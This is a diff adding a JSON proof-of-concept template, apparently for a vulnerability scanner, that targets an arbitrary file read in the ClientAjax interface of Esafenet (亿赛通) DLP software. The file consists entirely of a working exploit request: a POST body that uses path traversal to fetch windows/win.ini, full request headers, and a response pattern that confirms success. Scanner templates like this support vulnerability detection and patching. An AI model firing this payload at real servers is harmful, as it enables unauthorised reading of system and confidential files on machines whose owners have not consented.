@@ -1,0 +1,19 @@
+{
+	"name":"亿赛通-数据泄露防护(DLP)ClientAjax接口任意文件读取",
+	"tag":"yisaitong",
+	"type":"other",
+	"poc":{
+		"pocGet":"/CDGServer3/ClientAjax",
+		"pocPost":"command=downclientpak&InstallationPack=../../../../../../../../../../windows/win.ini&forward=index.jsp",
+		"header":{
+			"Accept":" */*",
+			"User-Agent":" Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Length":" 102",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"(extensions)"
+	}
+}
